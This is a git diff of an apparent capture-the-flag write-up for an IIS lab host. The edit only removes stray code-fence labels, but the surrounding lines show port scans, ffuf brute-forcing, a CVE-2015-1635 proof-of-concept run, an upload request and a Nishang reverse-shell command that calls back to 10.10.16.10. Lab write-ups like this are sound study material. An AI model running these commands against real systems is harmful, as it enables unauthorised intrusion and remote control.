@@ -11,7 +11,7 @@ draft: false
 
 ## Rustscan
 
-bash
+
 
 ```bash
 rustscan -a 10.10.10.93 -r 1-1000 -b 100
@@ -21,13 +21,13 @@ rustscan -a 10.10.10.93 -r 1-1000 -b 100
 
 ## Nmap
 
-bash
+
 
 ```bash
 nmap -sC -sV -T5 -oA nmap/initials 10.10.10.93
 ```
 
-bash
+
 
 ```bash
 # Nmap 7.94SVN scan initiated Sun May 18 14:03:44 2025 as: nmap -sC -sV -T5 -oA nmap/initials 10.10.10.93
@@ -55,7 +55,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 - I performed directory discovery using `ffuf` and found a directory called `uploadedfiles` but encountered a 403 Access Denied error. This prompted me to search for bypass techniques.
 
-bash
+
 
 ```bash
 ffuf -u http://10.10.10.93/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 150
@@ -73,7 +73,6 @@ ffuf -u http://10.10.10.93/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 150
 
 ![Pasted image 20250518151928.png](images/Pasted_image_20250518151928.png)
 
-yml
 
 ```yml
 Title: Microsoft IIS 7.5 Classic ASP Authentication Bypass
@@ -107,7 +106,7 @@ http://10.10.10.93/uploadedfiles:$i30:$INDEX_ALLOCATION
 - I tried to exploit this, but it failed because the prerequisite "password protected directory with administrative asp scripts" wasn't present in our target.
 - After attempting several other exploits without success, I checked for HTTP version vulnerabilities like MS15-034 (CVE-2015-1635).
 
-bash
+
 
 ```bash
 python CVE-2015-1635-POC.py -t 10.10.10.93
@@ -138,7 +137,7 @@ python CVE-2015-1635-POC.py -t 10.10.10.93
 - This meant I needed to discover which file extensions were permitted. While Burp Suite's Intruder could be used, it would be painfully slow for this task, so I opted for `ffuf` instead.
 - The command for extension bruteforcing:
 
-bash
+
 
 ```bash
 ffuf -request fuzz.req -w /mnt/hgfs/SecLists-master/Discovery/Web-Content/raft-small-extensions.txt -request-proto http
@@ -146,7 +145,7 @@ ffuf -request fuzz.req -w /mnt/hgfs/SecLists-master/Discovery/Web-Content/raft-s
 
 - Here's the request file used (fuzz.req):
 
-r
+
 
 ```r
 POST /transfer.aspx HTTP/1.1
@@ -188,7 +187,6 @@ Upload
 
 ![Pasted image 20250518171122.png](images/Pasted_image_20250518171122.png)
 
-r
 
 ```r
 .config <== (Most promising)
@@ -244,7 +242,6 @@ Response.Write(o)
 
 - For a proper reverse shell, I used [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) with an added command at the end:
 
-powershell
 
 ```powershell
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 1337
